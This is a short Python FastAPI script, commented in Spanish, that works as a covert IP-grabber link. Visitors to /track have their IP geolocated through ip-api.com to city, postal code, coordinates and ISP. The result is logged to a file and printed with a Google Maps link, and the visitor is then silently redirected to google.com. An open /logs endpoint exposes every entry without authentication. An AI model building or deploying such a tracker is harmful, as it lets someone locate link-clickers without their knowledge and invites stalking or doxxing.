from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse, PlainTextResponse
from datetime import datetime
import os
import httpx

app = FastAPI()
LOG_FILE = "ip_logs.txt"

# Asegura que el archivo exista desde el arranque
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("Fecha y hora | IP | País | Región | Ciudad | ZIP | Coordenadas | Zona Horaria | ISP | Organización | AS\n")

@app.get("/")
def root():
    return RedirectResponse("/track")

@app.get("/track")
async def track(request: Request):
    # Intenta obtener la IP real del visitante (encabezado o conexión directa)
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.client.host
    
    # Consulta información geográfica con más precisión
    info = {
        "country": "Desconocido", 
        "countryCode": "Desconocido",
        "region": "Desconocido", 
        "regionName": "Desconocido",
        "city": "Desconocido", 
        "zip": "Desconocido",
        "lat": "Desconocido",
        "lon": "Desconocido",
        "timezone": "Desconocido",
        "isp": "Desconocido",
        "org": "Desconocido",
        "as": "Desconocido"
    }
    try:
        async with httpx.AsyncClient() as client:
            # Usa la API con más campos para mayor precisión
            r = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
            data = r.json()
            if data["status"] == "success":
                info["country"] = data.get("country", "Desconocido")
                info["countryCode"] = data.get("countryCode", "Desconocido")
                info["region"] = data.get("region", "Desconocido")
                info["regionName"] = data.get("regionName", "Desconocido")
                info["city"] = data.get("city", "Desconocido")
                info["zip"] = data.get("zip", "Desconocido")
                info["lat"] = data.get("lat", "Desconocido")
                info["lon"] = data.get("lon", "Desconocido")
                info["timezone"] = data.get("timezone", "Desconocido")
                info["isp"] = data.get("isp", "Desconocido")
                info["org"] = data.get("org", "Desconocido")
                info["as"] = data.get("as", "Desconocido")
    except Exception as e:
        print(f"Error al obtener información geográfica: {e}")
    
    # Prepara la información para logging con mayor detalle
    timestamp = datetime.now().isoformat()
    log_line = (f"{timestamp} | IP: {ip} | Country: {info['country']} ({info['countryCode']}) | "
                f"Region: {info['regionName']} ({info['region']}) | City: {info['city']} | "
                f"ZIP: {info['zip']} | Coords: {info['lat']},{info['lon']} | "
                f"Timezone: {info['timezone']} | ISP: {info['isp']} | "
                f"Org: {info['org']} | AS: {info['as']}\n")
    
    # Guarda la información en el archivo
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line)
    
    # Muestra la información en consola con mayor detalle
    print("=" * 100)
    print("NUEVO VISITANTE DETECTADO:")
    print(f"Timestamp: {timestamp}")
    print(f"IP: {ip}")
    print(f"País: {info['country']} ({info['countryCode']})")
    print(f"Región: {info['regionName']} ({info['region']})")
    print(f"Ciudad: {info['city']}")
    print(f"Código Postal: {info['zip']}")
    print(f"Coordenadas: {info['lat']}, {info['lon']}")
    print(f"Zona Horaria: {info['timezone']}")
    print(f"ISP: {info['isp']}")
    print(f"Organización: {info['org']}")
    print(f"Sistema Autónomo: {info['as']}")
    if info['lat'] != "Desconocido" and info['lon'] != "Desconocido":
        print(f"Google Maps: https://www.google.com/maps?q={info['lat']},{info['lon']}")
    print("=" * 100)
    
    return RedirectResponse("https://www.google.com")

@app.get("/logs", response_class=PlainTextResponse)
def get_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "El archivo de logs no existe aún."